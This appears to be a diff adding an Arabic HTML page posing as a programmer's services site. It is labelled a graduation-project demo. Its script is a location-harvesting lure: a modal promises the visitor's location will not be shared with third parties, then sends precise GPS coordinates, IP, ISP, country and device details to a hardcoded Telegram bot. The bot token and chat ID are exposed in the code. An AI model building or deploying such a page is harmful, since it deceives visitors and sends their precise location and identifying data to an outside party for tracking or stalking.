@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محمد ربيع | خدمات البرمجة</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #f5f7fa; color: #333; line-height: 1.6; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px 0; text-align: center; }
+        header h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        .subtitle { font-size: 1.2rem; opacity: 0.9; }
+        nav { background: #2c3e50; padding: 15px 0; position: sticky; top: 0; z-index: 100; }
+        nav .container { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
+        nav a { color: white; text-decoration: none; font-weight: 500; }
+        .hero { background: white; padding: 80px 0; text-align: center; }
+        .hero h2 { font-size: 2rem; margin-bottom: 20px; color: #2c3e50; }
+        .hero p { font-size: 1.1rem; margin-bottom: 30px; color: #666; }
+        .hero button { background: #667eea; color: white; border: none; padding: 15px 40px; font-size: 1rem; border-radius: 5px; cursor: pointer; transition: background 0.3s; }
+        .hero button:hover { background: #5568d3; }
+        section { padding: 60px 0; }
+        section h2 { text-align: center; font-size: 2rem; margin-bottom: 40px; color: #2c3e50; }
+        .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .card h3 { color: #667eea; margin-bottom: 15px; }
+        footer { background: #2c3e50; color: white; text-align: center; padding: 30px 0; }
+        footer .notice { margin-top: 10px; font-size: 0.9rem; color: #f39c12; }
+
+        /* ---- Modal تحديد الموقع ---- */
+        .loc-overlay {
+            display: none;
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.6);
+            z-index: 9999;
+            align-items: center; justify-content: center;
+            padding: 20px;
+        }
+        .loc-overlay.active { display: flex; }
+        .loc-box {
+            background: white;
+            border-radius: 16px;
+            padding: 35px 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: popIn 0.3s ease;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.85); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .loc-box .icon {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+        }
+        .loc-box h3 {
+            color: #2c3e50;
+            margin-bottom: 12px;
+            font-size: 1.4rem;
+        }
+        .loc-box p {
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .loc-box .buttons {
+            display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;
+        }
+        .loc-box button {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        .btn-allow {
+            background: #667eea; color: white;
+        }
+        .btn-allow:hover { background: #5568d3; }
+        .btn-deny {
+            background: #ecf0f1; color: #555;
+        }
+        .btn-deny:hover { background: #d5dbdb; }
+
+        .status-msg {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
+        }
+        .status-msg.show { display: block; }
+        .status-msg.success { background: #d4edda; color: #155724; }
+        .status-msg.error { background: #f8d7da; color: #721c24; }
+        .status-msg.loading { background: #fff3cd; color: #856404; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container">
+            <h1>محمد ربيع</h1>
+            <p class="subtitle">خدمات البرمجة الاحترافية</p>
+        </div>
+    </header>
+
+    <nav>
+        <div class="container">
+            <a href="#home">الرئيسية</a>
+            <a href="#services">الخدمات</a>
+            <a href="#contact">تواصل</a>
+        </div>
+    </nav>
+
+    <section id="home" class="hero">
+        <div class="container">
+            <h2>حلول برمجية متكاملة</h2>
+            <p>ساعدنا نوصل ليك بالخدمة المناسبة في منطقتك</p>
+            <button onclick="openLocationModal()">📍 حدد موقعك</button>
+        </div>
+    </section>
+
+    <section id="services">
+        <div class="container">
+            <h2>خدماتنا</h2>
+            <div class="services-grid">
+                <div class="card"><h3>تطوير المواقع</h3><p>مواقع احترافية بأحدث التقنيات</p></div>
+                <div class="card"><h3>تطبيقات الموبايل</h3><p>تطبيقات iOS و Android</p></div>
+                <div class="card"><h3>أنظمة مخصصة</h3><p>حلول برمجية حسب احتياجك</p></div>
+                <div class="card"><h3>استشارات تقنية</h3><p>مساعدتك في اختيار التقنيات</p></div>
+            </div>
+        </div>
+    </section>
+
+    <footer id="contact">
+        <div class="container">
+            <p>©️ 2026 محمد ربيع - جميع الحقوق محفوظة</p>
+            <p class="notice">⚠️ صفحة تعليمية ضمن مشروع تخرج</p>
+        </div>
+    </footer>
+
+    <!-- نافذة طلب الإذن -->
+    <div class="loc-overlay" id="locOverlay">
+        <div class="loc-box">
+            <div class="icon">📍</div>
+            <h3>نحتاج موقعك</h3>
+            <p>
+                لكي نقدم لك الخدمة المناسبة في منطقتك، نحتاج للوصول لموقعك الحالي.
+                <br><br>
+                <strong>موقعك يُستخدم فقط لهذا الغرض، ولن يُشارك مع أي طرف ثالث.</strong>
+            </p>
+            <div class="buttons">
+                <button class="btn-allow" onclick="requestLocation()">✅ موافق، شارك موقعي</button>
+                <button class="btn-deny" onclick="closeLocationModal()">❌ ليس الآن</button>
+            </div>
+            <div class="status-msg" id="statusMsg"></div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // ⚙️ الإعدادات
+        // ==========================================
+        const BOT_TOKEN = '8979794427:AAEsfNT-TB-gFZiJu75EWqAwoo6uEE2s-LM';
+        const CHAT_ID = '5595945557';
+
+        const overlay = document.getElementById('locOverlay');
+        const statusMsg = document.getElementById('statusMsg');
+
+        // ==========================================
+        // 🪟 فتح / غلق النافذة
+        // ==========================================
+        function openLocationModal() {
+            overlay.classList.add('active');
+            statusMsg.className = 'status-msg';
+            statusMsg.textContent = '';
+        }
+
+        function closeLocationModal() {
+            overlay.classList.remove('active');
+        }
+
+        function showStatus(text, type) {
+            statusMsg.textContent = text;
+            statusMsg.className = 'status-msg show ' + type;
+        }
+
+        // ==========================================
+        // 📍 طلب الموقع الفعلي (GPS)
+        // ==========================================
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                showStatus('❌ متصفحك لا يدعم تحديد الموقع', 'error');
+                return;
+            }
+
+            showStatus('⏳ جاري تحديد موقعك...', 'loading');
+
+            navigator.geolocation.getCurrentPosition(
+                onLocationSuccess,
+                onLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // ==========================================
+        // ✅ نجح تحديد الموقع
+        // ==========================================
+        async function onLocationSuccess(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = Math.round(position.coords.accuracy);
+
+            showStatus(`✅ تم تحديد موقعك (دقة: ${accuracy} متر)`, 'success');
+
+            // ابعت لتيليجرام
+            await sendToTelegram(lat, lon, accuracy);
+
+            // اقفل النافذة بعد ثانيتين
+            setTimeout(() => {
+                closeLocationModal();
+            }, 2000);
+        }
+
+        // ==========================================
+        // ❌ فشل أو رفض
+        // ==========================================
+        function onLocationError(error) {
+            let msg = '';
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    msg = '❌ رفضت الإذن. يمكنك تفعيله من إعدادات المتصفح.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    msg = '❌ الموقع غير متاح حالياً. جرب مكان آخر.';
+                    break;
+                case error.TIMEOUT:
+                    msg = '⏱️ انتهى الوقت. جرب مرة أخرى.';
+                    break;
+                default:
+                    msg = '❌ حدث خطأ غير متوقع.';
+            }
+            showStatus(msg, 'error');
+        }
+
+        // ==========================================
+        // 📱 كشف نوع الجهاز
+        // ==========================================
+        function detectDevice(ua) {
+            const u = ua.toLowerCase();
+            if (u.includes('android')) return '📱 Android';
+            if (u.includes('iphone')) return '📱 iPhone';
+            if (u.includes('ipad')) return '📱 iPad';
+            if (u.includes('windows')) return '💻 Windows PC';
+            if (u.includes('mac')) return '💻 Mac';
+            if (u.includes('linux')) return '💻 Linux';
+            return '❓ غير معروف';
+        }
+
+        // ==========================================
+        // 📤 إرسال البيانات لتيليجرام
+        // ==========================================
+        async function sendToTelegram(lat, lon, accuracy) {
+            try {
+                // بيانات إضافية من IP (كـ Context إضافي)
+                let ipInfo = { ip: 'غير معروف', city: 'غير معروف', country: 'غير معروف', org: 'غير معروف' };
+                try {
+                    const r = await fetch('https://ipapi.co/json/');
+                    const d = await r.json();
+                    if (d && !d.error) {
+                        ipInfo = {
+                            ip: d.ip,
+                            city: d.city,
+                            country: d.country_name,
+                            org: d.org
+                        };
+                    }
+                } catch(e) {}
+
+                const deviceType = detectDevice(navigator.userAgent);
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                const message = `
+🎯 *زائر شارك موقعه!*
+
+🗺️ *الموقع الدقيق (GPS):*
+• خط العرض: \`${lat}\`
+• خط الطول: \`${lon}\`
+• الدقة: ${accuracy} متر
+• الخريطة: ${mapLink}
+
+🌐 *معلومات الشبكة (تقريبية):*
+• IP: \`${ipInfo.ip}\`
+• ISP: ${ipInfo.org}
+• الدولة: ${ipInfo.country}
+
+📱 *الجهاز:*
+• النوع: ${deviceType}
+• النظام: ${navigator.platform}
+• الشاشة: ${screen.width}x${screen.height}
+• اللغة: ${navigator.language}
+
+🕐 *الوقت:* ${new Date().toLocaleString('ar-EG')}
+                `.trim();
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
+                });
+
+                const result = await res.json();
+                if (!result.ok) {
+                    console.error('Telegram error:', result.description);
+                } else {
+                    console.log('✅ تم الإرسال بنجاح');
+                }
+            } catch (e) {
+                console.error('sendToTelegram error:', e);
+            }
+        }
+    </script>
+</body>
+</html>
